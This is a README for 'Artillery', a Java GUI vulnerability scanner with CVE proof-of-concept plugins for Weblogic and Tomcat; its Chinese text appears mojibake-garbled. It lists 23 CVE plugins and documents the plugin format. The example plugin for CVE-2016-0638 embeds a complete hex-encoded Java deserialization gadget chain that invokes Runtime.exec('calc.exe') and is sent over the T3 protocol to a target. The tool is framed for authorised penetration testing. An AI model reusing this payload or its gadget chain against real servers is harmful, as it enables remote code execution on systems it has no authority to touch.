# Artillery æ’ä»¶åŒ– JAVA æ¼æ´æ‰«æå™¨ï¼ˆWeblogicã€Tomcatã€Spring...ï¼‰

JAVA æ’ä»¶åŒ–æ¼æ´æ‰«æå™¨ï¼ˆWeblogicã€Tomcatã€Spring...ï¼‰ï¼ŒGuiåŸºäºjavafxï¼ŒPOC ç›®å‰é›†æˆ Weblogic(21ä¸ª)ï¼ŒTomcat(2)ã€Shiroã€Springç­‰é™†ç»­æ›´æ–°ä¸­ã€‚

- æ’ä»¶åŒ–

- æ‰¹é‡æ‰«æ

- æ”¯æŒå¤šä¸ªJavaä¸­é—´ä»¶

  ![image-20220515013757781](README.assets/image-20220515013757781.png)

è”ç³»æ–¹å¼ï¼šMTI1MjgyMDg0OSMo6A//YjpAKXFxLmNvbQ==

æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿äº¤æµğŸ‘ï¼Œæäº¤POCè¯·æissueæˆ–è€…ç›´æ¥è”ç³»æˆ‘ä¹Ÿè¡Œï¼Œå¼€å‘èƒ½åŠ›å®åœ¨å ªå¿§ï¼Œå°±ä¸æ”¾æºç äº†ï¼Œéœ€è¦çš„å¸ˆå‚…å¯ä»¥ç›´æ¥é‚®ä»¶ç§èŠã€‚

## æ›´æ–°è®°å½•

```
2022.05.16 - æ›´æ–°äº†æ’ä»¶ç›®å½•å¼‚å¸¸é—®é¢˜ã€Tomcat ç³»åˆ—æ¼æ´ POC 2ä¸ª
                CVE-2017-12615 CVE_2017_12615.jar
                Tomcatåå°æ³„æ¼ ADMIN_PAGE.jar
                
2022.05.16 - æ›´æ–°ä¸èƒ½åŒæ—¶æ‰«æä¸åŒç±»å‹POCçš„é—®é¢˜ï¼Œæ›´æ–°POC HTTPSé—®é¢˜

2022.05.15 - æ›´æ–°ä¸€äº›å°bug

2022.05.15 - æ›´æ–° Weblogic ç³»åˆ—æ¼æ´ POC 10ä¸ª
                CVE-2020-14883 CVE_2020_14883.class
                CVE-2020-14882 CVE_2020_14882.class
                CVE-2019-2729 CVE_2019_2729.class
                CVE-2019-2725 CVE_2019_2725.class
                CVE-2018-3252 CVE_2018_3252.class
                CVE-2018-2894 CVE_2018_2894.class
                CVE-2017-3506 CVE_2017_3506.class
                CVE-2017-10271 CVE_2017_10271.class
                CVE-2014-4210 CVE_2014_4210.class
                CVE-2018-3245 CVE_2018_3245.class

2022.05.12 - æ›´æ–° Weblogic T3ååºåˆ—åŒ–ç³»åˆ— POC 11ä¸ª
                CVE-2015-4852 CVE_2015_4852.class
                CVE-2016-0638 CVE_2016_0638.class
                CVE-2016-3510 CVE_2016_3510.class
                CVE-2017-3248 CVE_2017_3248.class
                CVE-2018-2628 CVE_2018_2628.class
                CVE-2018-2893 CVE_2018_2893.class
                CVE-2018-3191 CVE_2018_3191.class
                CVE-2019-2890 CVE_2019_2890.class
                CVE-2020-2551 CVE_2020_2551.class
                CVE-2020-2555 CVE_2020_2555.class
                CVE-2020-2883 CVE_2020_2883.class
                
2022.05.12 - artillery V1.0 
```

### Usage:

POCæ’ä»¶ç›®å½•æ”¾åœ¨åŒç›®å½•ä¸‹ç›®å½•ç»“æ„å¦‚ä¸‹ï¼ŒPlugin/ä¸­é—´ä»¶ç±»å‹/libs(pocçš„ä¾èµ–)ã€payloads(pocæœ¬ä½“)/ã€‚

```
â”œâ”€â”€ Plugin
â”‚Â Â  â””â”€â”€ weblogic
â”‚Â Â      â”œâ”€â”€ libs
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ commons-codec-1.2.jar
â”‚Â Â      â”‚Â Â  â””â”€â”€ commons-collections-3.1.jar
â”‚Â Â      â””â”€â”€ payloads
â”‚Â Â          â”œâ”€â”€ CVE_2015_4852.jar
â”‚Â Â          â”œâ”€â”€ CVE_2016_0638.class
â”‚Â Â          â”œâ”€â”€ CVE_2016_3510.class
â”‚Â Â          â”œâ”€â”€ CVE_2017_3248.jar
â”‚Â Â          â”œâ”€â”€ CVE_2018_2628.class
â”‚Â Â          â”œâ”€â”€ CVE_2018_2893.class
â”‚Â Â          â”œâ”€â”€ CVE_2018_3191.class
â”‚Â Â          â”œâ”€â”€ CVE_2019_2890.class
â”‚Â Â          â”œâ”€â”€ CVE_2020_2551.class
â”‚Â Â          â”œâ”€â”€ CVE_2020_2555.class
â”‚Â Â          â””â”€â”€ CVE_2020_2883.class
â””â”€â”€ artillery-1.0-SNAPSHOT-jar-with-dependencies.jar
```

æ‰«æå™¨UI

![image-20220515013803650](README.assets/image-20220515013803650.png)

å³é”®æ·»åŠ æ‰«æä»»åŠ¡ï¼Œä»»åŠ¡ç›®æ ‡æ”¯æŒå¤šä¸ªã€‚

![image-20220512130002107](README.assets/image-20220512130002107.png)

æ‰«ææˆªå›¾

![image-20220515013814116](README.assets/image-20220515013814116.png)

## POCæ’ä»¶ç¼–å†™è§„èŒƒ

ä»¥ CVE-2016-0638 ä¸ºä¾‹ï¼Œ

1. éœ€è¦å®šä¹‰4ä¸ªå˜é‡ nameã€descriptã€codeã€resultï¼Œå…¶ä¸­resultæ˜¯é»˜è®¤çš„æ‰«æç»“æœï¼Œè¿™äº›æ˜¯è¯¥POCçš„åŸºæœ¬ä¿¡æ¯ã€‚

2. éœ€è¦å®šä¹‰ä¸€ä¸ªç©ºæ„é€ å‡½æ•°ï¼Œä¸ä¸ºç©ºä¹Ÿè¡Œã€‚

3. Checkå‡½æ•°ï¼Œæ‰«ææ—¶è°ƒç”¨çš„å°±æ˜¯è¯¥å‡½æ•°ï¼Œå‚æ•°ä¸º  String target ä¾‹å¦‚(http://127.0.0.1)ï¼Œ

   è¿”å›å€¼ä¸ºString resultï¼Œå³æ‰«æç»“æœï¼Œä¾‹å¦‚  "å­˜åœ¨æ¼æ´"

4. System.out.print()çš„è¾“å‡ºä¼šè¢«é‡å®šå‘åˆ°æ‰«æå™¨ä¸‹æ–¹çš„è¾“å‡ºæ§åˆ¶å°ä¸­ï¼Œä¾‹å¦‚POCä¸­ System.out.println("å›æ˜¾ï¼š"+res) å°±ä¼šåœ¨è¾“å‡ºåœ¨æ‰«æå™¨ä¸­ï¼Œå¦‚å›¾ã€‚

5. æœ€ç»ˆç¼–è¯‘æˆclassæˆ–è€…jaråŒ…éƒ½å¯ï¼Œ**æ³¨æ„æ–‡ä»¶å‘½åé¡»ä¸ç±»åç›¸åŒ(å¦‚CVE-2016-0638.class)**ï¼Œå°†éœ€è¦çš„ä¾èµ–æ”¾åˆ° Plugin/ä¸­é—´ä»¶ç±»å‹/libs(pocçš„ä¾èµ–)ï¼Œpocæ”¾åˆ° Plugin/ä¸­é—´ä»¶ç±»å‹/payloads

   ![image-20220512131124928](README.assets/image-20220512131124928.png)

```
import com.artplugin.T3Protocol;
import java.net.URL;
public class CVE_2016_0638{
// éœ€è¦4ä¸ªå‚æ•° nameã€descriptã€codeã€resultï¼Œå…¶ä¸­resultæ˜¯é»˜è®¤çš„æ‰«æç»“æœ
    private String name = "weblogic T3ååºåˆ—åŒ–(CVE-2016-0638)";
    private String descript = "StreamMessageImpl ç±»ç»•è¿‡é»‘åå•ã€‚";
    private String code = "CVE-2016-0638";
    private String result = "æœªçŸ¥é”™è¯¯";
   
  // éœ€è¦ä¸€ä¸ªæ„é€ å‡½æ•°
    public CVE_2016_0638() {
    }

	//æ‰«ææ—¶ä¼šè°ƒç”¨Checkå‡½æ•°ã€å‚æ•°ä¸º  String target ä¾‹å¦‚ï¼ˆhttp://127.0.0.1ï¼‰ã€‚
    public String Check(String target) throws Exception {
        //gadget.CVE_2016_0638()
        String checkPayload = "aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78";
        String[] checkSig = {
                "weblogic.jms.common.StreamMessageImpl",
                "org.apache.commons.collections.functors.InvokerTransformer",
                "$Proxy",
                "weblogic.rjvm.ClassTableEntry"
                };
        if (target.equals("0")) {
            return "urlæ ¼å¼é”™è¯¯";
        }
        URL url = new URL(target);
        String res  = T3Protocol.sendPayload(url.getHost(),url.getPort(),checkPayload,3000);
        System.out.println("å›æ˜¾ï¼š"+res);  
        for(String sig : checkSig){
            if(res.contains(sig)){
                return "å­˜åœ¨ "+this.name;
            }
        }
        return "æœªå‘ç° "+this.name;
        //æ ¹æ®å›æ˜¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´
    }
    public static void main(String[] args) throws Exception {
        CVE_2016_0638 test = new CVE_2016_0638();
        String res = test.Check("http://127.0.0.1:7001");
        System.out.println(res);
    }

}

```



## å‚è€ƒ

https://github.com/0xn0ne/weblogicScanner

https://github.com/5up3rc/weblogic_cmd



## ğŸ“œå…è´£å£°æ˜

1. æœ¬å·¥å…·ä»…é¢å‘æ‹¥æœ‰åˆæ³•æˆæƒçš„æ¸—é€æµ‹è¯•å®‰å…¨äººå‘˜åŠè¿›è¡Œå¸¸è§„æ“ä½œçš„ç½‘ç»œè¿ç»´äººå‘˜ï¼Œç”¨æˆ·å¯åœ¨å–å¾—è¶³å¤Ÿåˆæ³•æˆæƒä¸”éå•†ç”¨çš„å‰æä¸‹è¿›è¡Œä¸‹è½½ã€å¤åˆ¶ã€ä¼ æ’­æˆ–ä½¿ç”¨ã€‚
2. åœ¨ä½¿ç”¨æœ¬å·¥å…·çš„è¿‡ç¨‹ä¸­ï¼Œæ‚¨åº”ç¡®ä¿è‡ªå·±çš„æ‰€æœ‰è¡Œä¸ºç¬¦åˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œä¸”ä¸å¾—å°†æ­¤è½¯ä»¶ç”¨äºè¿åä¸­å›½äººæ°‘å…±å’Œå›½ç›¸å…³æ³•å¾‹çš„æ´»åŠ¨ã€‚æœ¬å·¥å…·æ‰€æœ‰ä½œè€…å’Œè´¡çŒ®è€…ä¸æ‰¿æ‹…ç”¨æˆ·æ“…è‡ªä½¿ç”¨æœ¬å·¥å…·ä»äº‹ä»»ä½•è¿æ³•æ´»åŠ¨æ‰€äº§ç”Ÿçš„ä»»ä½•è´£ä»»ã€‚